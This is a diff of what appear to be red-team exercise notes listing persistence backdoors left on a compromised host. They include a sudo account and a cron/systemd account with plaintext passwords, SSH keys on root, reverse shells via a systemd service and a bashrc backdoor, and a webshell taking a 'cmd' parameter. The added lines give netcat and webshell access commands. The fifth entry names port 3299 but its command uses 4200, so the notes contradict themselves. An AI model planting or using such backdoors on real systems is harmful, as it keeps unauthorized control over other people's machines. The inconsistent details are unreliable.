@@ -21,8 +21,8 @@ http://192.168.11.132:81/monitoring_service.php?cmd=whoami
 
 #### Persistence Methods 
 1. Sudo user: username: ansibled, password:WinningCDT1!
-2. Ssh key on users: root and redteam
+2. Ssh key on users: root and redteam 
 3. Cron job and Systemd timer: username: sql.service, password:redteamsucks
-4. Reverse Shell connection open on port 4200 via systemd service
-5. Reverse Shell connection open on port 3299 via bashrc backdoor
-6. Webshell on http
+4. Reverse Shell connection open on port 4200 via systemd service - nc <target_ip> 4200
+5. Reverse Shell connection open on port 3299 via bashrc backdoor - nc <target_ip> 4200
+6. Webshell on http - http://<ip>:81/monitoring_service.php?cmd=whoami
